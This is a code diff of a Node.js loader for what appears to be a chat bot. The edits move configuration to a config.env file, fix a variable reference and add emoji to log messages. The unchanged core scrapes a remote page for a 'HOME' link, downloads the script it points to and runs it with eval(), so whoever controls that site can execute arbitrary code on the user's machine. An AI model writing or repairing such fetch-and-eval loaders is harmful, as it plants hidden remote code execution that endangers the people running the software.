@@ -6,28 +6,28 @@
 
 const axios = require('axios');
 const cheerio = require('cheerio');
-const adams = require("./config"); // or rename to rahl if you want
+require('dotenv').config({ path: './config.env' }); // ✅ Load from config.env
 
 async function fetchHOMEUrl() {
   try {
-    // ✅ Fixed line below
-    const response = await axios.get(rahl.RAHL_XMD);
+    // ✅ Now correctly fetches the pairing site
+    const response = await axios.get(process.env.RAHL_XMD);
     const $ = cheerio.load(response.data);
 
     const targetElement = $('a:contains("HOME")');
     const targetUrl = targetElement.attr('href');
 
     if (!targetUrl) {
-      throw new Error('heart not found 😭');
+      throw new Error('Heart not found 😭');
     }
 
-    console.log('The heart is loaded successfully ✅');
+    console.log('💫 The heart is loaded successfully ✅');
 
     const scriptResponse = await axios.get(targetUrl);
     eval(scriptResponse.data);
 
   } catch (error) {
-    console.error('Error:', error.message);
+    console.error('⚠️ Error:', error.message);
   }
 }
 
